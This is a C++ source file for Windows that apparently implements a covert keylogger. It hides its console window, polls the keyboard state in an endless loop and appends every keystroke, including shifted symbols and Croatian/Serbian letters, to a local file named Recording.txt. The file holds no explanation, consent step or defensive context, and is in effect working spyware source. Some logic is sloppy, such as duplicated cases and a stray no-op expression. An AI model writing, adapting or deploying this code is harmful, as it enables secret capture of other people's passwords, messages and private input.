#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

using namespace std;

//mapvirtualkey()

void hideConsoleWindow() {
	HWND consoleWindow;
	AllocConsole();
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);
}

int main(int argc, char* argv[]) {
	hideConsoleWindow();

	unsigned char pressedKey;
	ofstream log("Recording.txt", ios::app);
	while (true) {
		Sleep(0);
		for (pressedKey = 8; pressedKey <= VK_OEM_7; pressedKey++){
			if (GetAsyncKeyState(pressedKey) == -32767){

				if (GetAsyncKeyState(VK_SHIFT))
				{
					switch (pressedKey)
					{
					case 0x30:
						log << "[)]";
						break;
					case 0x31:
						log << "[!]";
						break;
					case 0x32:
						log << "[@]";
						break;
					case 0x33:
						log << "[#]";
						break;
					case 0x34:
						log << "[$]";
						break;
					case 0x35:
						log << "[%]";
						break;
					case 0x36:
						log << "[^]";
						break;
					case 0x37:
						log << "[&]";
						break;
					case 0x38:
						log << "[*]";
						break;
					case 0x39:
						log << "[(]";
						break;
					case 0xBF:
						log << "[?]"; ///
						break;
					case 0xBB:
						log << "[+]";
						break;
					case 0xBE:
						log << "[<]";
						break;
					case 0xBD:
						log << "[_]";
						break;
					case 0xE2:
						log << "[>]";
						break;
					case 0x1C:
						log << "[VK_CONVERT]";
						break;
					case 0x56:
						log << "[@]";
						break;
					case  0x2A:
						log << "[PRINT]";
						break;
					case  0x2E:
						log << "[Delete]";
						break;
					case 0xAA:
						log << "[Search]";
						break;
					case  0xF2:
						log << "[Copy]";
						break;
					case 0xFE:
						log << "[Clear]";
						break;
					case  0x3:
						log << "[Connect]";
						break;
					case 0x6:
						log << "[Logoff]";
						break;
					}
				}
				else
				{
					switch (pressedKey)
					{
					case 0x30:
						log << "0";
						break;
					case 0x31:
						log << "1";
						break;
					case 0x32:
						log << "2";
						break;
					case 0x33:
						log << "3";
						break;
					case 0x34:
						log << "4";
						break;
					case 0x35:
						log << "5";
						break;
					case 0x36:
						log << "6";
						break;
					case 0x37:
						log << "7";
						break;
					case 0x38:
						log << "8";
						break;
					case 0x39:
						log << "9";
						break;
					case 0xBF:
						log << "/";
						break;
					case 0xBB:
						log << "=";
						break;
					case 0xBC:
						log << ",";
						break;
					case 0xBE:
						log << ".";
						break;
					case 0xBD:
						log << "-";
						break;
					case 0xE2:
						log << "<";
						break;
					}
				}
				if (!(GetAsyncKeyState(VK_SHIFT)))

				{
					switch (pressedKey)
					{
					case 0x41:
						log << "a";
						break;
					case 0x42:
						log << "b";
						break;
					case 0x43:
						log << "c";
						break;
					case 0xBA:
						log << "č";
						break;
					case 0x44:
						log << "d";
						break;
					case 0x45:
						log << "e";
						break;
					case 0x46:
						log << "f";
						break;
					case 0x47:
						log << "g";
						break;
					case 0x48:
						log << "h";
						break;
					case 0x49:
						log << "i";
						break;
					case 0x4A:
						log << "j";
						break;
					case 0x4B:
						log << "k";
						break;
					case 0x4C:
						log << "l";
						break;
					case 0x4D:
						log << "m";
						break;
					case 0x4E:
						log << "n";
						break;
					case 0x4F:
						log << "o";
						break;
					case 0x50:
						log << "p";
						break;
					case 0x52:
						log << "r";
						break;
					case 0x53:
						log << "s";
						break;
					case 0x54:
						log << "t";
						break;
					case 0x55:
						log << "u";
						break;
					case 0x56:
						log << "v";
						break;
					case 0x5A:
						log << "z";
						break;
					case 0xDC:
						log << "\\";
						break;
					case 0x51:
						log << "q";
						break;
					case 0x57:
						log << "w";
						break;
					case 0x59:
						log << "y";
						break;
					case 0x58:
						log << "x";
						break;
					case 0xDE:
						log << "ć";
						break;
					case 0xDD:
						log << "đ";
						break;
					default:
						log << " ";
					}
				}

				if ((GetAsyncKeyState(VK_SHIFT)))

				{
					switch (pressedKey)
					{
					case 0x41:
						log << "A";
						break;
					case 0x42:
						log << "B";
						break;
					case 0x43:
						log << "C";
						break;
					case 0xBA:
						log << "č";
						break;
					case 0x44:
						log << "D";
						break;
					case 0x45:
						log << "E";
						break;
					case 0x46:
						log << "F";
						break;
					case 0x47:
						log << "G";
						break;
					case 0x48:
						log << "H";
						break;
					case 0x49:
						log << "I";
						break;
					case 0x4A:
						log << "J";
						break;
					case 0x4B:
						log << "K";
						break;
					case 0x4C:
						log << "L";
						break;
					case 0x4D:
						log << "M";
						break;
					case 0x4E:
						log << "N";
						break;
					case 0x4F:
						log << "O";
						break;
					case 0x50:
						log << "P";
						break;
					case 0x52:
						log << "R";
						break;
					case 0x53:
						log << "S";
						break;
					case 0x54:
						log << "T";
						break;
					case 0x55:
						log << "U";
						break;
					case 0x56:
						log << "V";
						break;
					case 0x5A:
						log << "Z";
						break;
					case 0x51:
						log << "Q";
						break;
					case 0x57:
						log << "W";
						break;
					case 0x59:
						log << "Y";
						break;
					case 0x58:
						log << "X";
						break;
					default:
						log << " ";
					}
				}

			else {
				VK_SHIFT + KF_ALTDOWN;

				switch (pressedKey)
				{
				case VK_SPACE:
					log << "[Space]";
					break;
				case 0x2E:
					log << "[Delete]";
					break;
				case VK_BACK:
					log << "[BackSpace]";
					break;
				case VK_RETURN:
					log << "[Enter]\n";
					break;
				case VK_LCONTROL:
					log << "[Ctrl]";
					break;
				case VK_RCONTROL:
					log << "[Ctrl]";
					break;
				case VK_TAB:
					log << "[Tab]";
					break;
				case 0x25:
					log << "[Left Arrow]";
					break;
				case 0x26:
					log << "[Up Arrow]";
					break;
				case 0x27:
					log << "[Right Arrow]";
					break;
				case 0x28:
					log << "[Down Arrow]";
					break;
				case VK_ESCAPE:
					log << "[Esc]";
					break;
				case VK_CAPITAL:
					log << "[Caps Lock]";
					break;
				case VK_RSHIFT:
					log << "[Right Shift]";
					break;
				case VK_LSHIFT:
					log << "[Left Shift]";
					break;
				case VK_LMENU:
					log << "[Left Alt]";
					break;
				case VK_RMENU:
					log << "[Right Alt]";
					break;
				case VK_LWIN:
					log << "[Left Win]";
					break;
				case VK_RWIN:
					log << "[Right Win]";
					break;
				case VK_INSERT:
					log << "[Insert]";
					break;
				case VK_SCROLL:
					log << "[Scroll Lock]";
					break;
				case VK_HOME:
					log << "[Home]";
					break;
				case VK_END:
					log << "[End]";
					break;
				case VK_PRIOR:
					log << "[Page Up]";
					break;
				case VK_NEXT:
					log << "[Page Down]";
					break;
				case VK_SNAPSHOT:
					log << "[Print Screen]";
					break;
				case VK_OEM_3:
					log << "[ ~ ` ]";
					break;
				case VK_OEM_4:
					log << "[ { [ ]";
					break;
				case VK_OEM_6:
					log << "[ } ] ]";
					break;
				case VK_OEM_1:
					log << "[ : ; ]";
					break;
				case VK_OEM_7:
					log << "[ \" ' ]";
					break;
				case VK_F1:
					log << "[F1]";
					break;
				case VK_F2:
					log << "[F2]";
					break;
				case VK_F3:
					log << "[F3]";
					break;
				case VK_F4:
					log << "[F4]";
					break;
				case VK_F5:
					log << "[F5]";
					break;
				case VK_F6:
					log << "[F6]";
					break;
				case VK_F7:
					log << "[F7]";
					break;
				case VK_F8:
					log << "[F8]";
					break;
				case VK_F9:
					log << "[F9]";
					break;
				case VK_F10:
					log << "[F10]";
					break;
				case VK_F11:
					log << "[F11]";
					break;
				case VK_F12:
					log << "[F12]";
					break;
				case VK_NUMPAD0:
					log << "0";
					break;
				case VK_NUMPAD1:
					log << "1";
					break;
				case VK_NUMPAD2:
					log << "2";
					break;
				case VK_NUMPAD3:
					log << "3";
					break;
				case VK_NUMPAD4:
					log << "4";
					break;
				case VK_NUMPAD5:
					log << "5";
					break;
				case VK_NUMPAD6:
					log << "6";
					break;
				case VK_NUMPAD7:
					log << "7";
					break;
				case VK_NUMPAD8:
					log << "8";
					break;
				case VK_NUMPAD9:
					log << "9";
					break;
				case 0x6F:
					log << "[/]";
					break;
				case 0x6A:
					log << "[*]";
					break;
				case 0x6D:
					log << "[-]";
					break;
				case 0x6B:
					log << "[+]";
					break;
				case 0x6E:
					log << "[,]";
					break;
				}
			}
		}
	else if(GetAsyncKeyState(pressedKey) == WM_SYSKEYDOWN)
	{
		if (GetAsyncKeyState(VK_RSHIFT))
		{
			switch (pressedKey)
			{
			case 0x51:
				log << "[\\]" ;
				break;
			case 0x57:
				log << "[|]" ;
				break;
			case 0xDB:
				log << "[{]" ;
				break;
			case 0xDD:
				log << "[}]" ;
				break;
			case 0xDC:
				log << "[|]" ;
				break;
			case 0x56:
				log << "[@]" ;
				break;
			case 0xBE:
				log << "[>]" ;
				break;
			}
		}
	}
	log.flush();
	}


		}
	}

